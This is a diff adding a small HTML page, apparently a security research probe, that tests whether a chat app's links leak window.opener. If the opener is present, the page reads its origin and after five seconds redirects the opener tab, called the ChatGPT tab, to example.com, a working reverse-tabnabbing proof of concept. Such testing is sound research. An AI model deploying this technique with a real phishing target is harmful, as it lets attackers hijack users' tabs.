@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>T35 opener probe (harmless)</title></head>
+<body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
+<h2 style="color:#f33">T35 OPENER PROBE — Pluto Security research, harmless</h2>
+<pre id="out">starting...</pre>
+<script>
+(function () {
+  var out = document.getElementById("out");
+  function log(m) { out.textContent += "\n" + m; }
+  log("T35 loaded " + Date.now());
+  log("opener: " + (window.opener ? "PRESENT" : "null (noopener was used)"));
+  if (window.opener) {
+    var o = "";
+    try { o = String(window.opener.origin); } catch (e) { o = "ERR " + e.name; }
+    log("opener origin: " + o);
+    log("planned action in 5s: navigate OPENER (the ChatGPT tab) to example.com — harmless demo");
+    setTimeout(function () {
+      try { window.opener.location = "https://example.com/T35-NABBED"; log("opener navigation SENT"); }
+      catch (e) { log("opener navigation ERR: " + e.name + " " + e.message); }
+    }, 5000);
+  } else {
+    log("no opener: tabnabbing via this path is DEAD (noopener set)");
+  }
+})();
+</script>
+</body>
+</html>
